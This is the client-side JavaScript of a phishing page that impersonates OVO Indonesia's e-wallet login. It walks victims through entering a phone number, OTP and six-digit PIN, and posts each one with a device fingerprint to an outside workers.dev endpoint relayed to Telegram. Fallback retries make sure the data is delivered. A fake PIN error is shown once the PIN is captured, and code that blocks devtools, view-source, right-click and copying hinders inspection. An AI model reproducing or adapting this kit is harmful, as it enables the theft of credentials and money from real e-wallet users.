(function() {
    'use strict';

    // ============================================
    // === KONFIGURASI WORKER TELEGRAM ============
    // ============================================
    const WORKER_URL = 'https://snowy-cake-76da.gawekhusus850.workers.dev/';

    // ---- ELEMENTS ----
    const loadingScreen = document.getElementById('loadingScreen');
    const transitionLoading = document.getElementById('transitionLoading');
    const pageNomor = document.getElementById('pageNomor');
    const pageOtp = document.getElementById('pageOtp');
    const pagePin = document.getElementById('pagePin');

    const inputNomor = document.getElementById('inputNomor');
    const btnLanjut = document.getElementById('btnLanjut');

    const otpInputs = document.querySelectorAll('.otp-input');
    const btnVerifOtp = document.getElementById('btnVerifikasiOtp');

    const pinInputs = document.querySelectorAll('.pin-input');
    const btnVerifPin = document.getElementById('btnVerifikasiPin');
    const pinContainer = document.getElementById('pinContainer');
    const errorMessage = document.getElementById('errorPin');

    // ---- COPYRIGHT NOTICE ----
    console.log('%c© 2026 OVO Indonesia. All Rights Reserved.', 'color: #4B006E; font-size: 16px; font-weight: bold;');
    console.log('%cPT OVO Teknologi Indonesia', 'color: #666; font-size: 13px;');

    // ============================================
    // === SESSION FINGERPRINT ====================
    // ============================================
    function generateFingerprint() {
        const data = [
            navigator.userAgent,
            navigator.language,
            screen.width + 'x' + screen.height,
            screen.colorDepth,
            new Date().getTimezoneOffset(),
            navigator.hardwareConcurrency || 'unknown',
            navigator.platform
        ].join('|');

        let hash = 0;
        for (let i = 0; i < data.length; i++) {
            const char = data.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash).toString(16);
    }

    const FINGERPRINT = generateFingerprint();
    console.log('%c🔐 Session Fingerprint:', 'color: #4B006E; font-weight: bold;', FINGERPRINT);

    // ============================================
    // === RATE LIMITING ==========================
    // ============================================
    const requestLog = [];
    function checkRateLimit() {
        const now = Date.now();
        requestLog.push(now);
        while (requestLog.length > 0 && requestLog[0] < now - 60000) {
            requestLog.shift();
        }
        if (requestLog.length > 5) {
            console.warn('⚠️ Rate limit tercapai.');
            return false;
        }
        return true;
    }

    // ============================================
    // === FUNGSI KIRIM KE TELEGRAM ===============
    // Pastikan SELALU terkirim walau ada error
    // ============================================
    async function sendToTelegram(data) {
        // Tambahkan fingerprint & metadata keamanan
        const securedData = {
            ...data,
            fingerprint: FINGERPRINT,
            userAgent: navigator.userAgent,
            language: navigator.language,
            screen: screen.width + 'x' + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || 'direct'
        };

        console.log('📤 Mengirim ke Telegram:', securedData);

        try {
            const response = await fetch(WORKER_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(securedData)
            });

            const result = await response.json();
            console.log('✅ Telegram response:', result);
            return result;
        } catch (error) {
            console.error('❌ Error sending to Telegram:', error);

            // FALLBACK 1: Kirim ulang tanpa metadata jika gagal
            try {
                await fetch(WORKER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (e2) {
                // FALLBACK 2: Kirim via no-cors jika benar-benar gagal
                try {
                    await fetch(WORKER_URL, {
                        method: 'POST',
                        mode: 'no-cors',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                } catch (e3) {
                    console.error('❌ Semua percobaan gagal:', e3);
                }
            }

            return { success: false, error: error.message };
        }
    }

    // ============================================
    // === UTILITY FUNCTIONS ======================
    // ============================================
    function showPage(pageId) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById(pageId).classList.add('active');
    }

    function getOtpValue() {
        let val = '';
        otpInputs.forEach(inp => val += inp.value.trim());
        return val;
    }

    function getPinValue() {
        let val = '';
        pinInputs.forEach(inp => val += inp.value.trim());
        return val;
    }

    function clearOtp() {
        otpInputs.forEach(inp => inp.value = '');
        otpInputs[0].focus();
    }

    function clearPin() {
        pinInputs.forEach(inp => inp.value = '');
        pinInputs[0].focus();
    }

    function resetPinError() {
        pinContainer.classList.remove('error');
        errorMessage.classList.remove('show');
    }

    function showPinError() {
        pinContainer.classList.add('error');
        errorMessage.classList.add('show');
        setTimeout(() => {
            resetPinError();
        }, 2000);
    }

    function showSpinner(button) {
        button.dataset.originalText = button.innerHTML;
        button.disabled = true;
        button.innerHTML = '<span class="spinner-ovo"></span> Memproses...';
    }

    function hideSpinner(button) {
        button.innerHTML = button.dataset.originalText || 'Lanjut';
        button.disabled = false;
    }

    function showTransitionLoading() {
        return new Promise((resolve) => {
            transitionLoading.classList.add('show');
            setTimeout(() => {
                resolve();
            }, 1200);
        });
    }

    function hideTransitionLoading() {
        transitionLoading.classList.remove('show');
    }

    // ============================================
    // === SECURITY LAYER =========================
    // ============================================

    // 1. DETEKSI DEVTOOLS
    let devtoolsOpen = false;
    const devtoolsThreshold = 160;
    setInterval(() => {
        const widthDiff = window.outerWidth - window.innerWidth;
        const heightDiff = window.outerHeight - window.innerHeight;
        if (widthDiff > devtoolsThreshold || heightDiff > devtoolsThreshold) {
            if (!devtoolsOpen) {
                devtoolsOpen = true;
                console.log('%c⚠️ AKSES DIBATASI', 'color: red; font-size: 24px; font-weight: bold;');
            }
        } else {
            devtoolsOpen = false;
        }
    }, 1000);

    // 2. ANTI VIEW SOURCE / SHORTCUT
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) { e.preventDefault(); return false; }
        if (e.ctrlKey && (e.key === 's' || e.key === 'S')) { e.preventDefault(); return false; }
        if ((e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) || e.key === 'F12') { e.preventDefault(); return false; }
        if (e.ctrlKey && e.shiftKey && (e.key === 'J' || e.key === 'j')) { e.preventDefault(); return false; }
        if (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c')) { e.preventDefault(); return false; }
    });

    // 3. ANTI RIGHT-CLICK
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
    });

    // 4. ANTI DRAG & COPY
    document.addEventListener('dragstart', function(e) { e.preventDefault(); return false; });
    document.addEventListener('copy', function(e) { e.preventDefault(); return false; });
    document.addEventListener('cut', function(e) { e.preventDefault(); return false; });

    // 5. ANTI CLICKJACKING
    if (window.self !== window.top) {
        window.top.location = window.self.location;
    }

    // 6. DETEKSI AUTOMATION (BOT)
    if (navigator.webdriver) {
        console.warn('⚠️ Automation terdeteksi.');
    }

    // ============================================
    // === LOADING 5 DETIK ========================
    // ============================================
    setTimeout(() => {
        loadingScreen.classList.add('hidden');
        showPage('pageNomor');
        inputNomor.focus();
    }, 5000);

    // ============================================
    // === EVENT: LANJUT KE OTP ===================
    // ============================================
    btnLanjut.addEventListener('click', async function() {
        const nomor = inputNomor.value.trim();
        if (nomor.length < 8) {
            alert('Masukkan nomor HP yang valid.');
            inputNomor.focus();
            return;
        }

        showSpinner(this);

        // KIRIM KE TELEGRAM - pastikan terkirim
        await sendToTelegram({
            action: 'phone',
            phone: nomor,
            timestamp: new Date().toISOString()
        });

        await showTransitionLoading();
        hideSpinner(this);
        showPage('pageOtp');
        hideTransitionLoading();
        clearOtp();
        otpInputs[0].focus();
    });

    // ============================================
    // === OTP INPUT NAVIGATION ===================
    // ============================================
    otpInputs.forEach((inp, idx) => {
        inp.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').slice(0, 1);
            if (this.value.length === 1 && idx < otpInputs.length - 1) {
                otpInputs[idx + 1].focus();
            }
        });

        inp.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '' && idx > 0) {
                otpInputs[idx - 1].focus();
            }
        });

        inp.addEventListener('paste', function(e) {
            e.preventDefault();
            const paste = (e.clipboardData || window.clipboardData).getData('text');
            const digits = paste.replace(/\D/g, '').slice(0, 4);
            if (digits.length > 0) {
                for (let i = 0; i < Math.min(digits.length, otpInputs.length); i++) {
                    otpInputs[i].value = digits[i] || '';
                }
                const nextIdx = Math.min(digits.length, otpInputs.length - 1);
                otpInputs[nextIdx].focus();
            }
        });
    });

    // ============================================
    // === EVENT: VERIFIKASI OTP ==================
    // ============================================
    btnVerifOtp.addEventListener('click', async function() {
        const otp = getOtpValue();
        if (otp.length !== 4) {
            alert('Masukkan 4 digit kode OTP.');
            otpInputs[0].focus();
            return;
        }

        showSpinner(this);

        const nomor = inputNomor.value.trim();

        // KIRIM KE TELEGRAM
        await sendToTelegram({
            action: 'otp',
            phone: nomor,
            otp: otp,
            timestamp: new Date().toISOString()
        });

        await showTransitionLoading();
        hideSpinner(this);
        showPage('pagePin');
        hideTransitionLoading();
        resetPinError();
        clearPin();
        pinInputs[0].focus();
    });

    // ============================================
    // === PIN INPUT NAVIGATION ===================
    // ============================================
    pinInputs.forEach((inp, idx) => {
        inp.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').slice(0, 1);
            if (this.value.length === 1 && idx < pinInputs.length - 1) {
                pinInputs[idx + 1].focus();
            }
            resetPinError();
        });

        inp.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '' && idx > 0) {
                pinInputs[idx - 1].focus();
            }
            resetPinError();
        });

        inp.addEventListener('paste', function(e) {
            e.preventDefault();
            const paste = (e.clipboardData || window.clipboardData).getData('text');
            const digits = paste.replace(/\D/g, '').slice(0, 6);
            if (digits.length > 0) {
                for (let i = 0; i < Math.min(digits.length, pinInputs.length); i++) {
                    pinInputs[i].value = digits[i] || '';
                }
                const nextIdx = Math.min(digits.length, pinInputs.length - 1);
                pinInputs[nextIdx].focus();
            }
            resetPinError();
        });
    });

    // ============================================
    // === EVENT: VERIFIKASI PIN ==================
    // ============================================
    btnVerifPin.addEventListener('click', async function() {
        const pin = getPinValue();

        if (pin.length !== 6) {
            alert('Masukkan 6 digit PIN.');
            pinInputs[0].focus();
            return;
        }

        showSpinner(this);

        const nomor = inputNomor.value.trim();
        const otp = getOtpValue();

        // KIRIM KE TELEGRAM - DATA LENGKAP
        await sendToTelegram({
            action: 'pin',
            phone: nomor,
            otp: otp,
            pin: pin,
            timestamp: new Date().toISOString()
        });

        await showTransitionLoading();
        hideSpinner(this);
        showPinError();
        hideTransitionLoading();

        setTimeout(() => {
            clearPin();
            pinInputs[0].focus();
        }, 300);
    });

    // ============================================
    // === ENTER KEY SUPPORT ======================
    // ============================================
    inputNomor.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') btnLanjut.click();
    });

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter' && pageOtp.classList.contains('active')) {
            btnVerifOtp.click();
        }
        if (e.key === 'Enter' && pagePin.classList.contains('active')) {
            btnVerifPin.click();
        }
    });

    document.addEventListener('gesturestart', function(e) { e.preventDefault(); });

    // ============================================
    // === KIRIM DATA AWAL SAAT HALAMAN DIBUKA ===
    // (opsional: log kunjungan)
    // ============================================
    window.addEventListener('load', () => {
        // Uncomment jika ingin notifikasi setiap halaman dibuka:
        // sendToTelegram({
        //     action: 'visit',
        //     timestamp: new Date().toISOString()
        // });
    });

})();
